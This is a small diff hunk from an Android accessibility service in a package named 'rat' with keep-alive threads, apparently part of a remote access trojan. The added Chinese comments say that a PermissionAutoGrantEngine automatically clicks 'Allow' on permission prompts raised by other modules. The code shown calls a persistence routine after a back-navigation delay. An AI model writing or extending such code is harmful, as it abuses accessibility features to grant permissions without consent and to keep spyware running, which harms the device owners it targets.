@@ -209,6 +209,8 @@ public class MyAccessibilityService extends AccessibilityService {
                     // 等待 BACK 动画完成 + 无障碍服务稳定
                     Thread.sleep(1500);
                     com.vendor.rat.keepalive.thread.StrategyThread.triggerKeepAliveIfNeeded();
+                    // 权限由 PermissionAutoGrantEngine 被动自动授予
+                    // 当其他模块触发权限请求时，自动点击"允许"
                 } catch (Exception e2) {
                     Log.e(TAG, "Strategy trigger error", e2);
                 }
